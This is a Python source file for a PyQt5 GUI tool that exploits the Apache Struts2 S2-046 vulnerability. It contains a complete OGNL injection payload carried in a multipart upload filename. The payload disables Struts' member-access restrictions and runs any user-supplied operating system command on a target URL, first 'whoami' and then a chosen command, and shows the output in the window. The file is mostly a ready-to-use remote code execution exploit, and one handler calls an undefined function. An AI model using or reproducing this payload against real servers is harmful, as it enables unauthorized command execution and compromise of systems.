# -*- coding: utf-8 -*-

"""
Module implementing s2046.
"""

from PyQt5.QtCore import pyqtSlot
from PyQt5.QtWidgets import QDialog
from PyQt5 import QtCore, QtGui, QtWidgets
from Ui_test import Ui_s2046
import requests

def exputf(url,command):
    # header = {'Content-Length':'1000000000','Cache-Control':'max-age=0','Upgrade-Insecure-Requests':'1','User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
    #           'Content-Type':'multipart/form-data; boundary=----WebKitFormBoundaryXd004BVJN9pBYBL2','Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    #           }
    a = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\x00b"
    a = a.replace('whoami',command)
    files ={"upload":(a,open('exp.txt', 'rb'),"text/plain")
    }
    r= requests.post(url, files=files)
    return(r.content.decode('utf-8')) 
    
def expgbk(url,command):
    # header = {'Content-Length':'1000000000','Cache-Control':'max-age=0','Upgrade-Insecure-Requests':'1','User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
    #           'Content-Type':'multipart/form-data; boundary=----WebKitFormBoundaryXd004BVJN9pBYBL2','Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    #           }
    a = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\x00b"
    a = a.replace('whoami',command)
    files ={"upload":(a,open('exp.txt', 'rb'),"text/plain")
    }
    r= requests.post(url, files=files)
    return(r.content.decode('gbk')) 

class s2046(QDialog, Ui_s2046):
    """
    Class documentation goes here.
    """

    def __init__(self, parent=None):
        """
        Constructor
        
        @param parent reference to the parent widget
        @type QWidget
        """
        super(s2046, self).__init__(parent)
        self.setupUi(self)
    
    @pyqtSlot()
    def on_pushButton_clicked(self):
        """
        Slot documentation goes here.
        """
        url = self.lineEdit.text()
        com = 'whoami'
        try:
            show = exputf(url, com)
            self.textBrowser_2.append(show)
        except Exception as e:
            try:
                show = expgbk(url, com)
                self.textBrowser_2.append(show)
            except Exception as ee:
                err = str(ee)
                self.textBrowser_2.append(err)
                self.textBrowser_2.append("s2-046:not existed")
        # TODO: not implemented yet
        # raise NotImplementedError
    
    @pyqtSlot(str)
    def on_lineEdit_textEdited(self, p0):
        """
        Slot documentation goes here.
        
        @param p0 DESCRIPTION
        @type str
        """
        # TODO: not implemented yet
        # raise NotImplementedError

    @pyqtSlot()
    def on_pushButton_3_clicked(self):
        """
        Slot documentation goes here.
        """
        self.textBrowser_2.setText('')
        # TODO: not implemented yet
        # raise NotImplementedError

    
    @pyqtSlot()
    def on_pushButton_2_clicked(self):
        """
        Slot documentation goes here.
        """
        url = self.lineEdit.text()
        com = self.lineEdit_2.text()
        try:
            show = exp(url, com)
            self.textBrowser_2.append(show)
        except Exception as e:
            try:
                show = expgbk(url, com)
                self.textBrowser_2.append(show)
            except Exception as ee:
                err = str(ee)
                self.textBrowser_2.append(err)
                self.textBrowser_2.append("s2-046:not existed")
        # TODO: not implemented yet
        # raise NotImplementedError
    
    @pyqtSlot(str)
    def on_lineEdit_2_textEdited(self, p0):
        """
        Slot documentation goes here.
        
        @param p0 DESCRIPTION
        @type str
        """
        # TODO: not implemented yet
        # raise NotImplementedError


if __name__ == "__main__":
    import sys
    app = QtWidgets.QApplication(sys.argv)
    ui = s2046()
    ui.show()
    sys.exit(app.exec_())
